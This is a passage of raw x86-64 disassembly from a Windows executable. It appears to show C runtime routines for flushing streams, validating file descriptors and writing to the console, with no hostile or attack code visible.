   14000df0c:	e8 7f bd ff ff       	call   0x140009c90
   14000df11:	90                   	nop
   14000df12:	bb 03 00 00 00       	mov    $0x3,%ebx
   14000df17:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   14000df1b:	3b 1d 4f 17 01 00    	cmp    0x1174f(%rip),%ebx        # 0x14001f670
   14000df21:	74 6e                	je     0x14000df91
   14000df23:	48 63 fb             	movslq %ebx,%rdi
   14000df26:	48 8b 05 4b 17 01 00 	mov    0x1174b(%rip),%rax        # 0x14001f678
   14000df2d:	48 8b 04 f8          	mov    (%rax,%rdi,8),%rax
   14000df31:	48 85 c0             	test   %rax,%rax
   14000df34:	75 02                	jne    0x14000df38
   14000df36:	eb 55                	jmp    0x14000df8d
   14000df38:	8b 40 14             	mov    0x14(%rax),%eax
   14000df3b:	90                   	nop
   14000df3c:	c1 e8 0d             	shr    $0xd,%eax
   14000df3f:	a8 01                	test   $0x1,%al
   14000df41:	74 19                	je     0x14000df5c
   14000df43:	48 8b 0d 2e 17 01 00 	mov    0x1172e(%rip),%rcx        # 0x14001f678
   14000df4a:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000df4e:	e8 71 03 00 00       	call   0x14000e2c4
   14000df53:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000df56:	74 04                	je     0x14000df5c
   14000df58:	ff 44 24 20          	incl   0x20(%rsp)
   14000df5c:	48 8b 05 15 17 01 00 	mov    0x11715(%rip),%rax        # 0x14001f678
   14000df63:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   14000df67:	48 83 c1 30          	add    $0x30,%rcx
   14000df6b:	ff 15 6f 21 00 00    	call   *0x216f(%rip)        # 0x1400100e0
   14000df71:	48 8b 0d 00 17 01 00 	mov    0x11700(%rip),%rcx        # 0x14001f678
   14000df78:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   14000df7c:	e8 8f a0 ff ff       	call   0x140008010
   14000df81:	48 8b 05 f0 16 01 00 	mov    0x116f0(%rip),%rax        # 0x14001f678
   14000df88:	48 83 24 f8 00       	andq   $0x0,(%rax,%rdi,8)
   14000df8d:	ff c3                	inc    %ebx
   14000df8f:	eb 86                	jmp    0x14000df17
   14000df91:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000df96:	e8 49 bd ff ff       	call   0x140009ce4
   14000df9b:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000df9f:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000dfa4:	48 83 c4 30          	add    $0x30,%rsp
   14000dfa8:	5f                   	pop    %rdi
   14000dfa9:	c3                   	ret
   14000dfaa:	cc                   	int3
   14000dfab:	cc                   	int3
   14000dfac:	40 53                	rex push %rbx
   14000dfae:	48 83 ec 20          	sub    $0x20,%rsp
   14000dfb2:	8b 41 14             	mov    0x14(%rcx),%eax
   14000dfb5:	48 8b d9             	mov    %rcx,%rbx
   14000dfb8:	c1 e8 0d             	shr    $0xd,%eax
   14000dfbb:	90                   	nop
   14000dfbc:	a8 01                	test   $0x1,%al
   14000dfbe:	74 28                	je     0x14000dfe8
   14000dfc0:	8b 41 14             	mov    0x14(%rcx),%eax
   14000dfc3:	90                   	nop
   14000dfc4:	c1 e8 06             	shr    $0x6,%eax
   14000dfc7:	a8 01                	test   $0x1,%al
   14000dfc9:	74 1d                	je     0x14000dfe8
   14000dfcb:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000dfcf:	e8 3c a0 ff ff       	call   0x140008010
   14000dfd4:	f0 81 63 14 bf fe ff 	lock andl $0xfffffebf,0x14(%rbx)
   14000dfdb:	ff 
   14000dfdc:	33 c0                	xor    %eax,%eax
   14000dfde:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000dfe2:	48 89 03             	mov    %rax,(%rbx)
   14000dfe5:	89 43 10             	mov    %eax,0x10(%rbx)
   14000dfe8:	48 83 c4 20          	add    $0x20,%rsp
   14000dfec:	5b                   	pop    %rbx
   14000dfed:	c3                   	ret
   14000dfee:	cc                   	int3
   14000dfef:	cc                   	int3
   14000dff0:	48 83 ec 28          	sub    $0x28,%rsp
   14000dff4:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   14000dff7:	75 0d                	jne    0x14000e006
   14000dff9:	e8 6e 9f ff ff       	call   0x140007f6c
   14000dffe:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000e004:	eb 42                	jmp    0x14000e048
   14000e006:	85 c9                	test   %ecx,%ecx
   14000e008:	78 2e                	js     0x14000e038
   14000e00a:	3b 0d 60 15 01 00    	cmp    0x11560(%rip),%ecx        # 0x14001f570
   14000e010:	73 26                	jae    0x14000e038
   14000e012:	48 63 c9             	movslq %ecx,%rcx
   14000e015:	48 8d 15 54 11 01 00 	lea    0x11154(%rip),%rdx        # 0x14001f170
   14000e01c:	48 8b c1             	mov    %rcx,%rax
   14000e01f:	83 e1 3f             	and    $0x3f,%ecx
   14000e022:	48 c1 e8 06          	shr    $0x6,%rax
   14000e026:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000e02a:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   14000e02e:	0f b6 44 c8 38       	movzbl 0x38(%rax,%rcx,8),%eax
   14000e033:	83 e0 40             	and    $0x40,%eax
   14000e036:	eb 12                	jmp    0x14000e04a
   14000e038:	e8 2f 9f ff ff       	call   0x140007f6c
   14000e03d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000e043:	e8 7c 9d ff ff       	call   0x140007dc4
   14000e048:	33 c0                	xor    %eax,%eax
   14000e04a:	48 83 c4 28          	add    $0x28,%rsp
   14000e04e:	c3                   	ret
   14000e04f:	cc                   	int3
   14000e050:	48 83 22 00          	andq   $0x0,(%rdx)
   14000e054:	48 8b c1             	mov    %rcx,%rax
   14000e057:	c3                   	ret
   14000e058:	48 83 21 00          	andq   $0x0,(%rcx)
   14000e05c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000e060:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000e064:	c7 42 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rdx)
   14000e06b:	c3                   	ret
   14000e06c:	48 83 ec 28          	sub    $0x28,%rsp
   14000e070:	48 8b 05 09 22 00 00 	mov    0x2209(%rip),%rax        # 0x140010280
   14000e077:	ff d0                	call   *%rax
   14000e079:	0f 1f 00             	nopl   (%rax)
   14000e07c:	48 83 c4 28          	add    $0x28,%rsp
   14000e080:	c3                   	ret
   14000e081:	cc                   	int3
   14000e082:	cc                   	int3
   14000e083:	cc                   	int3
   14000e084:	cc                   	int3
   14000e085:	cc                   	int3
   14000e086:	cc                   	int3
   14000e087:	cc                   	int3
   14000e088:	cc                   	int3
   14000e089:	cc                   	int3
   14000e08a:	cc                   	int3
   14000e08b:	cc                   	int3
   14000e08c:	cc                   	int3
   14000e08d:	cc                   	int3
   14000e08e:	cc                   	int3
   14000e08f:	cc                   	int3
   14000e090:	33 c0                	xor    %eax,%eax
   14000e092:	38 01                	cmp    %al,(%rcx)
   14000e094:	74 0e                	je     0x14000e0a4
   14000e096:	48 3b c2             	cmp    %rdx,%rax
   14000e099:	74 09                	je     0x14000e0a4
   14000e09b:	48 ff c0             	inc    %rax
   14000e09e:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   14000e0a2:	75 f2                	jne    0x14000e096
   14000e0a4:	c3                   	ret
   14000e0a5:	cc                   	int3
   14000e0a6:	cc                   	int3
   14000e0a7:	cc                   	int3
   14000e0a8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000e0ad:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000e0b2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000e0b7:	57                   	push   %rdi
   14000e0b8:	48 83 ec 30          	sub    $0x30,%rsp
   14000e0bc:	48 63 f9             	movslq %ecx,%rdi
   14000e0bf:	49 8b d9             	mov    %r9,%rbx
   14000e0c2:	8b cf                	mov    %edi,%ecx
   14000e0c4:	41 8b f0             	mov    %r8d,%esi
   14000e0c7:	48 8b ea             	mov    %rdx,%rbp
   14000e0ca:	e8 41 bf ff ff       	call   0x14000a010
   14000e0cf:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000e0d3:	75 11                	jne    0x14000e0e6
   14000e0d5:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000e0d9:	c7 43 2c 09 00 00 00 	movl   $0x9,0x2c(%rbx)
   14000e0e0:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000e0e4:	eb 5c                	jmp    0x14000e142
   14000e0e6:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000e0ec:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000e0f1:	44 8b ce             	mov    %esi,%r9d
   14000e0f4:	48 8b d5             	mov    %rbp,%rdx
   14000e0f7:	48 8b c8             	mov    %rax,%rcx
   14000e0fa:	ff 15 28 1f 00 00    	call   *0x1f28(%rip)        # 0x140010028
   14000e100:	85 c0                	test   %eax,%eax
   14000e102:	75 12                	jne    0x14000e116
   14000e104:	ff 15 8e 1f 00 00    	call   *0x1f8e(%rip)        # 0x140010098
   14000e10a:	8b c8                	mov    %eax,%ecx
   14000e10c:	48 8b d3             	mov    %rbx,%rdx
   14000e10f:	e8 10 9e ff ff       	call   0x140007f24
   14000e114:	eb ca                	jmp    0x14000e0e0
   14000e116:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000e11b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000e11f:	74 bf                	je     0x14000e0e0
   14000e121:	48 8b d7             	mov    %rdi,%rdx
   14000e124:	4c 8d 05 45 10 01 00 	lea    0x11045(%rip),%r8        # 0x14001f170
   14000e12b:	83 e2 3f             	and    $0x3f,%edx
   14000e12e:	48 8b cf             	mov    %rdi,%rcx
   14000e131:	48 c1 f9 06          	sar    $0x6,%rcx
   14000e135:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000e139:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000e13d:	80 64 d1 38 fd       	andb   $0xfd,0x38(%rcx,%rdx,8)
   14000e142:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000e147:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000e14c:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000e151:	48 83 c4 30          	add    $0x30,%rsp
   14000e155:	5f                   	pop    %rdi
   14000e156:	c3                   	ret
   14000e157:	cc                   	int3
   14000e158:	e9 4b ff ff ff       	jmp    0x14000e0a8
   14000e15d:	cc                   	int3
   14000e15e:	cc                   	int3
   14000e15f:	cc                   	int3
   14000e160:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   14000e165:	48 83 ec 28          	sub    $0x28,%rsp
   14000e169:	e8 f2 01 00 00       	call   0x14000e360
   14000e16e:	85 c0                	test   %eax,%eax
   14000e170:	74 24                	je     0x14000e196
   14000e172:	83 64 24 38 00       	andl   $0x0,0x38(%rsp)
   14000e177:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000e17c:	ba 01 00 00 00       	mov    $0x1,%edx
   14000e181:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000e186:	e8 45 02 00 00       	call   0x14000e3d0
   14000e18b:	85 c0                	test   %eax,%eax
   14000e18d:	74 07                	je     0x14000e196
   14000e18f:	0f b7 44 24 30       	movzwl 0x30(%rsp),%eax
   14000e194:	eb 05                	jmp    0x14000e19b
   14000e196:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000e19b:	48 83 c4 28          	add    $0x28,%rsp
   14000e19f:	c3                   	ret
   14000e1a0:	48 8b c4             	mov    %rsp,%rax
   14000e1a3:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000e1a7:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000e1ab:	57                   	push   %rdi
   14000e1ac:	48 83 ec 30          	sub    $0x30,%rsp
   14000e1b0:	48 8b fa             	mov    %rdx,%rdi
   14000e1b3:	48 8b d9             	mov    %rcx,%rbx
   14000e1b6:	48 85 c9             	test   %rcx,%rcx
   14000e1b9:	75 2e                	jne    0x14000e1e9
   14000e1bb:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000e1bf:	c7 42 2c 16 00 00 00 	movl   $0x16,0x2c(%rdx)
   14000e1c6:	48 89 50 f0          	mov    %rdx,-0x10(%rax)
   14000e1ca:	48 21 48 e8          	and    %rcx,-0x18(%rax)
   14000e1ce:	45 33 c9             	xor    %r9d,%r9d
   14000e1d1:	45 33 c0             	xor    %r8d,%r8d
   14000e1d4:	33 d2                	xor    %edx,%edx
   14000e1d6:	e8 31 9b ff ff       	call   0x140007d0c
   14000e1db:	83 c8 ff             	or     $0xffffffff,%eax
   14000e1de:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000e1e3:	48 83 c4 30          	add    $0x30,%rsp
   14000e1e7:	5f                   	pop    %rdi
   14000e1e8:	c3                   	ret
   14000e1e9:	8b 41 14             	mov    0x14(%rcx),%eax
   14000e1ec:	90                   	nop
   14000e1ed:	c1 e8 0c             	shr    $0xc,%eax
   14000e1f0:	24 01                	and    $0x1,%al
   14000e1f2:	74 07                	je     0x14000e1fb
   14000e1f4:	e8 a3 04 00 00       	call   0x14000e69c
   14000e1f9:	eb e0                	jmp    0x14000e1db
   14000e1fb:	e8 44 d9 ff ff       	call   0x14000bb44
   14000e200:	90                   	nop
   14000e201:	48 8b d7             	mov    %rdi,%rdx
   14000e204:	48 8b cb             	mov    %rbx,%rcx
   14000e207:	e8 10 00 00 00       	call   0x14000e21c
   14000e20c:	8b f8                	mov    %eax,%edi
   14000e20e:	48 8b cb             	mov    %rbx,%rcx
   14000e211:	e8 3a d9 ff ff       	call   0x14000bb50
   14000e216:	8b c7                	mov    %edi,%eax
   14000e218:	eb c4                	jmp    0x14000e1de
   14000e21a:	cc                   	int3
   14000e21b:	cc                   	int3
   14000e21c:	48 8b c4             	mov    %rsp,%rax
   14000e21f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000e223:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000e227:	57                   	push   %rdi
   14000e228:	48 83 ec 30          	sub    $0x30,%rsp
   14000e22c:	48 8b fa             	mov    %rdx,%rdi
   14000e22f:	48 8b d9             	mov    %rcx,%rbx
   14000e232:	48 85 c9             	test   %rcx,%rcx
   14000e235:	75 25                	jne    0x14000e25c
   14000e237:	48 89 50 f0          	mov    %rdx,-0x10(%rax)
   14000e23b:	45 33 c9             	xor    %r9d,%r9d
   14000e23e:	48 21 48 e8          	and    %rcx,-0x18(%rax)
   14000e242:	45 33 c0             	xor    %r8d,%r8d
   14000e245:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000e249:	c7 42 2c 16 00 00 00 	movl   $0x16,0x2c(%rdx)
   14000e250:	33 d2                	xor    %edx,%edx
   14000e252:	e8 b5 9a ff ff       	call   0x140007d0c
   14000e257:	83 c8 ff             	or     $0xffffffff,%eax
   14000e25a:	eb 55                	jmp    0x14000e2b1
   14000e25c:	8b 41 14             	mov    0x14(%rcx),%eax
   14000e25f:	83 ce ff             	or     $0xffffffff,%esi
   14000e262:	c1 e8 0d             	shr    $0xd,%eax
   14000e265:	90                   	nop
   14000e266:	a8 01                	test   $0x1,%al
   14000e268:	74 3d                	je     0x14000e2a7
   14000e26a:	e8 f1 d5 ff ff       	call   0x14000b860
   14000e26f:	48 8b cb             	mov    %rbx,%rcx
   14000e272:	8b f0                	mov    %eax,%esi
   14000e274:	e8 33 fd ff ff       	call   0x14000dfac
   14000e279:	48 8b cb             	mov    %rbx,%rcx
   14000e27c:	e8 23 df ff ff       	call   0x14000c1a4
   14000e281:	8b c8                	mov    %eax,%ecx
   14000e283:	48 8b d7             	mov    %rdi,%rdx
   14000e286:	e8 7d 02 00 00       	call   0x14000e508
   14000e28b:	85 c0                	test   %eax,%eax
   14000e28d:	79 05                	jns    0x14000e294
   14000e28f:	83 ce ff             	or     $0xffffffff,%esi
   14000e292:	eb 13                	jmp    0x14000e2a7
   14000e294:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000e298:	48 85 c9             	test   %rcx,%rcx
   14000e29b:	74 0a                	je     0x14000e2a7
   14000e29d:	e8 6e 9d ff ff       	call   0x140008010
   14000e2a2:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   14000e2a7:	48 8b cb             	mov    %rbx,%rcx
   14000e2aa:	e8 ed 03 00 00       	call   0x14000e69c
   14000e2af:	8b c6                	mov    %esi,%eax
   14000e2b1:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000e2b6:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000e2bb:	48 83 c4 30          	add    $0x30,%rsp
   14000e2bf:	5f                   	pop    %rdi
   14000e2c0:	c3                   	ret
   14000e2c1:	cc                   	int3
   14000e2c2:	cc                   	int3
   14000e2c3:	cc                   	int3
   14000e2c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000e2c9:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000e2ce:	55                   	push   %rbp
   14000e2cf:	48 8b ec             	mov    %rsp,%rbp
   14000e2d2:	48 83 ec 60          	sub    $0x60,%rsp
   14000e2d6:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   14000e2db:	83 3d 8a 0b 01 00 00 	cmpl   $0x0,0x10b8a(%rip)        # 0x14001ee6c
   14000e2e2:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   14000e2e6:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   14000e2ea:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   14000e2ee:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   14000e2f2:	75 10                	jne    0x14000e304
   14000e2f4:	0f 10 05 4d 04 01 00 	movups 0x1044d(%rip),%xmm0        # 0x14001e748
   14000e2fb:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   14000e2ff:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   14000e304:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   14000e308:	e8 93 fe ff ff       	call   0x14000e1a0
   14000e30d:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   14000e311:	8b f8                	mov    %eax,%edi
   14000e313:	75 0b                	jne    0x14000e320
   14000e315:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   14000e319:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000e320:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   14000e324:	74 0f                	je     0x14000e335
   14000e326:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   14000e329:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000e32d:	e8 2e 90 ff ff       	call   0x140007360
   14000e332:	89 58 20             	mov    %ebx,0x20(%rax)
   14000e335:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   14000e339:	74 0f                	je     0x14000e34a
   14000e33b:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   14000e33e:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000e342:	e8 19 90 ff ff       	call   0x140007360
   14000e347:	89 58 24             	mov    %ebx,0x24(%rax)
   14000e34a:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000e34f:	8b c7                	mov    %edi,%eax
   14000e351:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   14000e356:	48 83 c4 60          	add    $0x60,%rsp
   14000e35a:	5d                   	pop    %rbp
   14000e35b:	c3                   	ret
   14000e35c:	cc                   	int3
   14000e35d:	cc                   	int3
   14000e35e:	cc                   	int3
   14000e35f:	cc                   	int3
   14000e360:	40 53                	rex push %rbx
   14000e362:	48 83 ec 40          	sub    $0x40,%rsp
   14000e366:	48 8b 05 b3 06 01 00 	mov    0x106b3(%rip),%rax        # 0x14001ea20
   14000e36d:	33 db                	xor    %ebx,%ebx
   14000e36f:	48 83 f8 fe          	cmp    $0xfffffffffffffffe,%rax
   14000e373:	75 2e                	jne    0x14000e3a3
   14000e375:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000e37a:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   14000e37e:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000e382:	48 8d 0d b7 86 00 00 	lea    0x86b7(%rip),%rcx        # 0x140016a40
   14000e389:	45 33 c9             	xor    %r9d,%r9d
   14000e38c:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000e391:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000e396:	ff 15 84 1c 00 00    	call   *0x1c84(%rip)        # 0x140010020
   14000e39c:	48 89 05 7d 06 01 00 	mov    %rax,0x1067d(%rip)        # 0x14001ea20
   14000e3a3:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000e3a7:	0f 95 c3             	setne  %bl
   14000e3aa:	8b c3                	mov    %ebx,%eax
   14000e3ac:	48 83 c4 40          	add    $0x40,%rsp
   14000e3b0:	5b                   	pop    %rbx
   14000e3b1:	c3                   	ret
   14000e3b2:	cc                   	int3
   14000e3b3:	cc                   	int3
   14000e3b4:	48 83 ec 28          	sub    $0x28,%rsp
   14000e3b8:	48 8b 0d 61 06 01 00 	mov    0x10661(%rip),%rcx        # 0x14001ea20
   14000e3bf:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000e3c3:	77 06                	ja     0x14000e3cb
   14000e3c5:	ff 15 4d 1c 00 00    	call   *0x1c4d(%rip)        # 0x140010018
   14000e3cb:	48 83 c4 28          	add    $0x28,%rsp
   14000e3cf:	c3                   	ret
   14000e3d0:	48 8b c4             	mov    %rsp,%rax
   14000e3d3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000e3d7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000e3db:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000e3df:	57                   	push   %rdi
   14000e3e0:	48 83 ec 40          	sub    $0x40,%rsp
   14000e3e4:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   14000e3e9:	49 8b f8             	mov    %r8,%rdi
   14000e3ec:	4d 8b c8             	mov    %r8,%r9
   14000e3ef:	8b f2                	mov    %edx,%esi
   14000e3f1:	44 8b c2             	mov    %edx,%r8d
   14000e3f4:	48 8b e9             	mov    %rcx,%rbp
   14000e3f7:	48 8b d1             	mov    %rcx,%rdx
   14000e3fa:	48 8b 0d 1f 06 01 00 	mov    0x1061f(%rip),%rcx        # 0x14001ea20
   14000e401:	ff 15 09 1c 00 00    	call   *0x1c09(%rip)        # 0x140010010
   14000e407:	8b d8                	mov    %eax,%ebx
   14000e409:	85 c0                	test   %eax,%eax
   14000e40b:	75 6a                	jne    0x14000e477
   14000e40d:	ff 15 85 1c 00 00    	call   *0x1c85(%rip)        # 0x140010098
   14000e413:	83 f8 06             	cmp    $0x6,%eax
   14000e416:	75 5f                	jne    0x14000e477
   14000e418:	48 8b 0d 01 06 01 00 	mov    0x10601(%rip),%rcx        # 0x14001ea20
   14000e41f:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000e423:	77 06                	ja     0x14000e42b
   14000e425:	ff 15 ed 1b 00 00    	call   *0x1bed(%rip)        # 0x140010018
   14000e42b:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000e431:	48 8d 0d 08 86 00 00 	lea    0x8608(%rip),%rcx        # 0x140016a40
   14000e438:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000e43d:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000e443:	45 33 c9             	xor    %r9d,%r9d
   14000e446:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000e44b:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000e450:	ff 15 ca 1b 00 00    	call   *0x1bca(%rip)        # 0x140010020
   14000e456:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000e45c:	4c 8b cf             	mov    %rdi,%r9
   14000e45f:	48 8b c8             	mov    %rax,%rcx
   14000e462:	48 89 05 b7 05 01 00 	mov    %rax,0x105b7(%rip)        # 0x14001ea20
   14000e469:	44 8b c6             	mov    %esi,%r8d
   14000e46c:	48 8b d5             	mov    %rbp,%rdx
   14000e46f:	ff 15 9b 1b 00 00    	call   *0x1b9b(%rip)        # 0x140010010
   14000e475:	8b d8                	mov    %eax,%ebx
   14000e477:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000e47c:	8b c3                	mov    %ebx,%eax
   14000e47e:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000e483:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000e488:	48 83 c4 40          	add    $0x40,%rsp
   14000e48c:	5f                   	pop    %rdi
   14000e48d:	c3                   	ret
   14000e48e:	cc                   	int3
   14000e48f:	cc                   	int3
   14000e490:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000e495:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000e49a:	57                   	push   %rdi
   14000e49b:	48 83 ec 20          	sub    $0x20,%rsp
   14000e49f:	49 8b f9             	mov    %r9,%rdi
   14000e4a2:	49 8b d8             	mov    %r8,%rbx
   14000e4a5:	8b 0a                	mov    (%rdx),%ecx
   14000e4a7:	e8 58 ba ff ff       	call   0x140009f04
   14000e4ac:	90                   	nop
   14000e4ad:	48 8b 03             	mov    (%rbx),%rax
   14000e4b0:	48 63 08             	movslq (%rax),%rcx
   14000e4b3:	4c 8b d1             	mov    %rcx,%r10
   14000e4b6:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   14000e4ba:	48 8b c1             	mov    %rcx,%rax
   14000e4bd:	48 c1 f8 06          	sar    $0x6,%rax
   14000e4c1:	4c 8d 0d a8 0c 01 00 	lea    0x10ca8(%rip),%r9        # 0x14001f170
   14000e4c8:	41 83 e2 3f          	and    $0x3f,%r10d
   14000e4cc:	4f 8d 04 d2          	lea    (%r10,%r10,8),%r8
   14000e4d0:	49 8b 04 c1          	mov    (%r9,%rax,8),%rax
   14000e4d4:	42 f6 44 c0 38 01    	testb  $0x1,0x38(%rax,%r8,8)
   14000e4da:	74 09                	je     0x14000e4e5
   14000e4dc:	e8 eb 00 00 00       	call   0x14000e5cc
   14000e4e1:	8b d8                	mov    %eax,%ebx
   14000e4e3:	eb 0e                	jmp    0x14000e4f3
   14000e4e5:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000e4e9:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000e4f0:	83 cb ff             	or     $0xffffffff,%ebx
   14000e4f3:	8b 0f                	mov    (%rdi),%ecx
   14000e4f5:	e8 32 ba ff ff       	call   0x140009f2c
   14000e4fa:	8b c3                	mov    %ebx,%eax
   14000e4fc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000e501:	48 83 c4 20          	add    $0x20,%rsp
   14000e505:	5f                   	pop    %rdi
   14000e506:	c3                   	ret
   14000e507:	cc                   	int3
   14000e508:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000e50c:	48 83 ec 58          	sub    $0x58,%rsp
   14000e510:	4c 63 c1             	movslq %ecx,%r8
   14000e513:	45 33 c9             	xor    %r9d,%r9d
   14000e516:	41 83 f8 fe          	cmp    $0xfffffffe,%r8d
   14000e51a:	75 18                	jne    0x14000e534
   14000e51c:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   14000e520:	44 89 4a 34          	mov    %r9d,0x34(%rdx)
   14000e524:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000e528:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000e52f:	e9 8d 00 00 00       	jmp    0x14000e5c1
   14000e534:	85 c9                	test   %ecx,%ecx
   14000e536:	78 60                	js     0x14000e598
   14000e538:	44 3b 05 31 10 01 00 	cmp    0x11031(%rip),%r8d        # 0x14001f570
   14000e53f:	73 57                	jae    0x14000e598
   14000e541:	49 8b c8             	mov    %r8,%rcx
   14000e544:	4c 8d 15 25 0c 01 00 	lea    0x10c25(%rip),%r10        # 0x14001f170
   14000e54b:	83 e1 3f             	and    $0x3f,%ecx
   14000e54e:	49 8b c0             	mov    %r8,%rax
   14000e551:	48 c1 f8 06          	sar    $0x6,%rax
   14000e555:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000e559:	49 8b 04 c2          	mov    (%r10,%rax,8),%rax
   14000e55d:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000e562:	74 34                	je     0x14000e598
   14000e564:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   14000e569:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   14000e56e:	44 89 44 24 78       	mov    %r8d,0x78(%rsp)
   14000e573:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000e578:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   14000e57d:	4c 8d 4c 24 78       	lea    0x78(%rsp),%r9
   14000e582:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000e587:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000e58c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000e591:	e8 fa fe ff ff       	call   0x14000e490
   14000e596:	eb 2c                	jmp    0x14000e5c4
   14000e598:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   14000e59c:	45 33 c0             	xor    %r8d,%r8d
